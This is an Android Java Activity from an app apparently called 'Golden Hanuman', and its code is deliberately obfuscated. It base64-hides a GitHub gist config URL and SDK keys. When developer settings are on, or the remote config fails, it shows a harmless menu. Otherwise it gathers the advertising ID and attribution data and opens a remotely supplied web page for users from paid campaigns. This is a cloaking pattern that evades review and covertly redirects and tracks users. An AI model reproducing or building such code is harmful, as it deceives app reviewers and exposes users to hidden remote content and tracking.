package com.goooldden.haaannuman.jiqwqe;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.View;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.eyalbira.loadingdots.LoadingDots;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.goooldden.haaannuman.jiqwqe.ufn.LiiiP;
import com.goooldden.haaannuman.jiqwqe.ufn.OGol;
import com.ncorti.slidetoact.SlideToActView;
import com.onesignal.OneSignal;

import java.util.Map;


public class GH extends Activity {

    LoadingDots loadingDots;
    SlideToActView staS , staP, staC;
    int devvv;
    public static String insa;
    public static String oijna = "";
    public static String oijsd;
    public static String ojnsd;
    public static final String oneSigg = "MTE5ODA0MTItZTY5NS00NDM1LTg2MzYtZDU3ZDczNGQxY2Zi";
    public static final String appF = "bVJDdjdETk5GOUJrOXpjSGhaSHpmRw==";
    public static final String connnn = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjIyNDQxOTkzLzdmOTc5MjU0ZDQ5NzcxNGMxMDZmZWU1MmFiMGViMTc1L3Jhdy9Hb2xkZW5fSGFudW1hbg==";
    public String inds;
    public String ojds;
    Cssad cssad;

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onStart() {
        super.onStart();


        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(MainActivity.decooo(oneSigg));

        insa = AppsFlyerLib.getInstance().getAppsFlyerUID(this);
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    oijsd = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        }).start();


        AppsFlyerLib.getInstance().init(MainActivity.decooo(appF), new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {
                oijna = map.get(MainActivity.decooo("YWZfc3RhdHVz")).toString();
                if (oijna.equals(MainActivity.decooo("Tm9uLW9yZ2FuaWM="))){
                    String str =map.get(MainActivity.decooo("Y2FtcGFpZ24=")).toString();
                    ojnsd = ParGol.parGol(str,getPackageName(), oijsd, insa);

                }
            }

            @Override
            public void onConversionDataFail(String s) {

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {

            }

            @Override
            public void onAttributionFailure(String s) {

            }
        },this);
        AppsFlyerLib.getInstance().start(this);


    }
    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.gh);
        getWindow().addFlags(1024);


        devvv = Settings.Secure.getInt(this.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0);
        loadingDots = findViewById(R.id.prooro);
        staS = (SlideToActView) findViewById(R.id.example);
        staS.setAnimDuration(500);
        staP = (SlideToActView) findViewById(R.id.example1);
        staP.setAnimDuration(500);
        staC = (SlideToActView) findViewById(R.id.example2);
        staC.setAnimDuration(500);
        staS.setVisibility(View.INVISIBLE);
        staP.setVisibility(View.INVISIBLE);
        staC.setVisibility(View.INVISIBLE);
        OGol.gh = this;


        if (devvv == 0){

            new Thread(new Runnable() {
                @Override
                public void run() {

                    try {

                        cssad = SetImaga.cccccGol();


                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                String fff = cssad.getFbId();
                                FacebookSdk.setApplicationId(fff);
                                FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                                FacebookSdk.sdkInitialize(getApplicationContext());
                                FacebookSdk.fullyInitialize();
                                FacebookSdk.setAutoInitEnabled(true);
                                FacebookSdk.setAutoLogAppEventsEnabled(true);


                                AppEventsLogger.activateApp(getApplication());
                                AppLinkData.fetchDeferredAppLinkData(GH.this, new AppLinkData.CompletionHandler() {
                                    @Override
                                    public void onDeferredAppLinkDataFetched(@Nullable AppLinkData appLinkData) {

                                        if (appLinkData == null) {
                                            appLinkData = AppLinkData.createFromActivity(GH.this);
                                        }
                                        if (appLinkData != null) {
                                            Uri url = appLinkData.getTargetUri();
                                            inds = url.getQuery();
                                            ojds = ParGol.parGol(inds,getPackageName(), oijsd, insa);


                                        }else {

                                        }
                                    }
                                });

                            }
                        });

                    }catch (Exception e){
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Log.d("weq", "2");
                                loadingDots.setVisibility(View.INVISIBLE);
                                staS.setVisibility(View.VISIBLE);
                                staP.setVisibility(View.VISIBLE);
                                staC.setVisibility(View.VISIBLE);
                                staS.setOnSlideCompleteListener(new SlideToActView.OnSlideCompleteListener() {
                                    @Override
                                    public void onSlideComplete(@NonNull SlideToActView slideToActView) {
                                        staP.setVisibility(View.INVISIBLE);
                                        staC.setVisibility(View.INVISIBLE);
                                        startActivity(new Intent(getApplicationContext(),MainActivity.class));
                                        finishAffinity();
                                    }
                                });

                                staP.setOnSlideCompleteListener(new SlideToActView.OnSlideCompleteListener() {
                                    @Override
                                    public void onSlideComplete(@NonNull SlideToActView slideToActView) {
                                        staS.setVisibility(View.INVISIBLE);
                                        staC.setVisibility(View.INVISIBLE);
                                        startActivity(new Intent(getApplicationContext(), LiiiP.class));
                                        finishAffinity();
                                    }
                                });

                                staC.setOnSlideCompleteListener(new SlideToActView.OnSlideCompleteListener() {
                                    @Override
                                    public void onSlideComplete(@NonNull SlideToActView slideToActView) {
                                        staS.setVisibility(View.INVISIBLE);
                                        staP.setVisibility(View.INVISIBLE);
                                        finish();
                                    }
                                });
                            }
                        });
                    }
                }
            }).start();


            String savedLink = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(MainActivity.decooo("c2F2ZWRVcmw="), "pppppp");
            if (savedLink.equals("pppppp")) {
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        String ldkd = null;
                        if (oijna.equals(MainActivity.decooo("Tm9uLW9yZ2FuaWM="))) {
                            ldkd = cssad.getUrl() + ojnsd;
                            Intent intent = new Intent(getApplicationContext(),OGol.class);
                            intent.putExtra(MainActivity.decooo("d3d3dw=="), ldkd);
                            startActivity(intent);
                            finishAffinity();
                        } else if (inds != null) {
                            ldkd = cssad.getUrl() + ojds;
                            Intent intent = new Intent(getApplicationContext(),OGol.class);
                            intent.putExtra(MainActivity.decooo("d3d3dw=="), ldkd);
                            startActivity(intent);
                            finishAffinity();
                        } else {
                            if (cssad.getKeyDefault().equals(MainActivity.decooo("Tk8="))) {
                                runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        loadingDots.setVisibility(View.INVISIBLE);
                                        staS.setVisibility(View.VISIBLE);
                                        staP.setVisibility(View.VISIBLE);
                                        staC.setVisibility(View.VISIBLE);
                                        staS.setOnSlideCompleteListener(new SlideToActView.OnSlideCompleteListener() {
                                            @Override
                                            public void onSlideComplete(@NonNull SlideToActView slideToActView) {
                                                staP.setVisibility(View.INVISIBLE);
                                                staC.setVisibility(View.INVISIBLE);
                                                startActivity(new Intent(getApplicationContext(), MainActivity.class));
                                                finishAffinity();
                                            }
                                        });

                                        staP.setOnSlideCompleteListener(new SlideToActView.OnSlideCompleteListener() {
                                            @Override
                                            public void onSlideComplete(@NonNull SlideToActView slideToActView) {
                                                staS.setVisibility(View.INVISIBLE);
                                                staC.setVisibility(View.INVISIBLE);
                                                startActivity(new Intent(getApplicationContext(), LiiiP.class));
                                                finishAffinity();
                                            }
                                        });

                                        staC.setOnSlideCompleteListener(new SlideToActView.OnSlideCompleteListener() {
                                            @Override
                                            public void onSlideComplete(@NonNull SlideToActView slideToActView) {
                                                staS.setVisibility(View.INVISIBLE);
                                                staP.setVisibility(View.INVISIBLE);
                                                finish();
                                            }
                                        });
                                    }
                                });

                            } else {
                                String strAppsFlyer = cssad.getKeyDefault() + MainActivity.decooo("P2J1bmRsZT0=") + getPackageName() + MainActivity.decooo("JmFkX2lkPQ==") + oijsd + MainActivity.decooo("JmFwcHNfaWQ9") + insa + MainActivity.decooo("JmRldl9rZXk9") + MainActivity.decooo(appF);
                                ldkd = cssad.getUrl() + strAppsFlyer;
                                Intent intent = new Intent(getApplicationContext(),OGol.class);
                                intent.putExtra(MainActivity.decooo("d3d3dw=="), ldkd);
                                startActivity(intent);
                                finishAffinity();
                            }
                        }
                    }
                }, 5000);

            }else {
                Intent intent = new Intent(getApplicationContext(),OGol.class);
                intent.putExtra(MainActivity.decooo("d3d3dw=="), savedLink);
                startActivity(intent);
                finishAffinity();
            }




        }else {

            loadingDots.setVisibility(View.INVISIBLE);
            staS.setVisibility(View.VISIBLE);
            staP.setVisibility(View.VISIBLE);
            staC.setVisibility(View.VISIBLE);

            staS.setOnSlideCompleteListener(new SlideToActView.OnSlideCompleteListener() {
                @Override
                public void onSlideComplete(@NonNull SlideToActView slideToActView) {
                    staP.setVisibility(View.INVISIBLE);
                    staC.setVisibility(View.INVISIBLE);
                    startActivity(new Intent(getApplicationContext(),MainActivity.class));
                    finishAffinity();
                }
            });

            staP.setOnSlideCompleteListener(new SlideToActView.OnSlideCompleteListener() {
                @Override
                public void onSlideComplete(@NonNull SlideToActView slideToActView) {
                    staS.setVisibility(View.INVISIBLE);
                    staC.setVisibility(View.INVISIBLE);
                    startActivity(new Intent(getApplicationContext(), LiiiP.class));
                    finishAffinity();
                }
            });

            staC.setOnSlideCompleteListener(new SlideToActView.OnSlideCompleteListener() {
                @Override
                public void onSlideComplete(@NonNull SlideToActView slideToActView) {
                    staS.setVisibility(View.INVISIBLE);
                    staP.setVisibility(View.INVISIBLE);
                    finish();
                }
            });
        }
    }

    public static class ParGol{
        @RequiresApi(api = Build.VERSION_CODES.O)
        public static String parGol(String jfds, String erwq, String pojm, String khsd){
             String zzzz;
             String xxxx;
             String ccccc;
             String vvvvvv;
             String bbbbbb;
             String nnnnnnn;
             String mmmmmmmmm;

            String[] oijnds = jfds.split("::");

            try {
                zzzz = oijnds[0];
            }catch (Exception e){
                zzzz = "";
            }
            try {
                xxxx = oijnds[1];
            }catch (Exception e){
                xxxx = "";
            }

            try {
                ccccc = oijnds[2];
            }catch (Exception e){
                ccccc = "";

            }

            try {
                vvvvvv = oijnds[3];
            }catch (Exception e){
                vvvvvv = "";
            }

            try {
                bbbbbb = oijnds[4];
            }catch (Exception e){
                bbbbbb = "";
            }


            try {
                nnnnnnn = oijnds[5];
            }catch (Exception e){
                nnnnnnn = "";
            }

            try {
                mmmmmmmmm = oijnds[6];
            }catch (Exception e){
                mmmmmmmmm = "";
            }

            OneSignal.sendTag(MainActivity.decooo("c3ViX2FwcA=="), xxxx);

            String iiiiiiiiuiu = zzzz + MainActivity.decooo("P2J1bmRsZT0=") + erwq + MainActivity.decooo("JmFkX2lkPQ==") + pojm + MainActivity.decooo("JmFwcHNfaWQ9") + khsd +
                    MainActivity.decooo("JnN1YjY9") + xxxx +
                    MainActivity.decooo("JnN1Yjc9") + ccccc +
                    MainActivity.decooo("JnN1YjI9") + vvvvvv +
                    MainActivity.decooo("JnN1YjM9") + bbbbbb +
                    MainActivity.decooo("JnN1YjQ9") + nnnnnnn +
                    MainActivity.decooo("JnN1YjU9") + mmmmmmmmm +
                    MainActivity.decooo("JmRldl9rZXk9") + MainActivity.decooo(GH.appF);
            return iiiiiiiiuiu;

        }

    }
}
